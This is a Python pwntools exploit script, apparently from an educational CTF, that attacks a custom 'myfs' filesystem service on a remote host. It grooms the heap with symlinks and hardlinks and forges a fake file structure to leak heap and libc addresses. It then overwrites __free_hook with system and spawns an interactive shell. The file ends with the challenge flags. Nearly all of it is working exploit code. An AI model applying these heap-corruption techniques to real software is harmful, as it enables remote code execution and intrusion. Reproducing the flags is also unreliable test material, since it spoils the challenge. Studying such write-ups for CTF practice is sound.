from pwn import *
import solve

elf = ELF('./myfs')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# p = elf.process()
p = remote('edu-ctf.zoolab.org', 30213)
p.recvuntil(b'sha256(')
h = p.recvuntil(b' + ')[:-3].decode()
ans = solve.solve(h, 20)
print(ans)
p.recvuntil(b'answer: ')
p.sendline(str(ans).encode())

def useradd(uname, passwd):
    p.recvuntil(b'> ')
    p.sendline(b'useradd ' + uname + b' ' + passwd)

def login(uname, passwd):
    p.recvuntil(b'> ')
    p.sendline(b'login ' + uname + b' ' + passwd)

def create(type, fname):
    p.recvuntil(b'> ')
    p.sendline(b'create ' + type + b' ' + fname)

def rm(fname):
    p.recvuntil(b'> ')
    p.sendline(b'rm ' + fname)

def slss(fname):
    p.recvuntil(b'> ')
    p.sendline(b'slss ' + fname)

def slsd(fname):
    p.recvuntil(b'> ')
    p.sendline(b'slsd ' + fname)

def hlss(fname):
    p.recvuntil(b'> ')
    p.sendline(b'hlss ' + fname)

def hlsd(fname):
    p.recvuntil(b'> ')
    p.sendline(b'hlsd ' + fname)

def read(fname, cont):
    p.recvuntil(b'> ')
    p.sendline(b'read ' + fname)
    p.send(cont)

def write(fname):
    p.recvuntil(b'> ')
    p.sendline(b'write ' + fname)

def ls():
    p.recvuntil(b'> ')
    p.sendline(b'ls')

for i in range(3, 256):
    user = b'user' + str(i).encode()
    useradd(user, user)

useradd(b'yingmuo', b'yingmuo')
login(b'yingmuo', b'yingmuo')

for i in range(14):
    create(b'normfile', b'f' + str(i).encode())
    read(b'f' + str(i).encode(), b'skps' + str(i).encode().ljust(0x78, b'a'))

for i in range(256):
    slss(b'f6')
    slsd(b'sf6_' + str(i).encode())

# raw_input()
for i in range(14):
    rm(b'f' + str(i).encode())

for i in range(14):
    create(b'normfile', b'f2_' + str(i).encode())
    # read(b'f2_' + str(i).encode(), b'aaaa')

create(b'normfile', b'Achunk')
# create(b'normfile', b'Bchunk')
# read(b'Achunk', b'a'*16)

def fake_file(fid, uid, refcnt, metadata, size, fn, data):
    return p64(fid + (uid << 8) + (refcnt << 16) + (metadata << 24) + (size << 32)) + p64(fn) + p64(data)

# print(fake_file(0, 0, 1, 0, 8, 0, 0xe0))
read(b'Achunk', fake_file(0, 0, 1, 0, 8, 0, 0xb0)[:-7])
write(b'sf6_0')
leak_heap = u64(p.recvuntil(b'/')[:-1].ljust(8, b'\x00'))
print(hex(leak_heap))
heap_base = leak_heap - 0x1280

f2_0_baddr = heap_base + 0xdf30
leak_libc_addr = heap_base + 0xda00
read(b'f2_0', p64(leak_libc_addr))
read(b'Achunk', fake_file(0, 0, 1, 0, 8, 0, f2_0_baddr))
write(b'sf6_0')
leak_libc = u64(p.recvuntil(b'/')[:-1].ljust(8, b'\x00'))
print(hex(leak_libc))
libc_base = leak_libc - 0x1ebbe0
libc.address = libc_base

# one_gadget = libc_base + 0xe6c7e
# one_gadget = libc_base + 0xe6c81
one_gadget = libc_base + 0xe6c84
# print(fake_file(0, 0, 1, 0b00000100, 8, 0, f2_0_baddr))
read(b'Achunk', fake_file(0, 0, 1, 0b00000100, 8, 0, f2_0_baddr))
read(b'f2_0', p64(libc.symbols['__free_hook']))
read(b'sf6_0', p64(libc.symbols['system']))
print(hex(one_gadget))
raw_input()
for i in range(15):
    create(b'normfile', b'f3_' + str(i).encode())
create(b'normfile', b'sh')

for i in range(15):
    rm(b'f3_' + str(i).encode())
rm(b'sh')

p.interactive()

# flag1: i am stupid
# flag2: how2lose
# flag3: FLAG{i hate the padding oracle :(}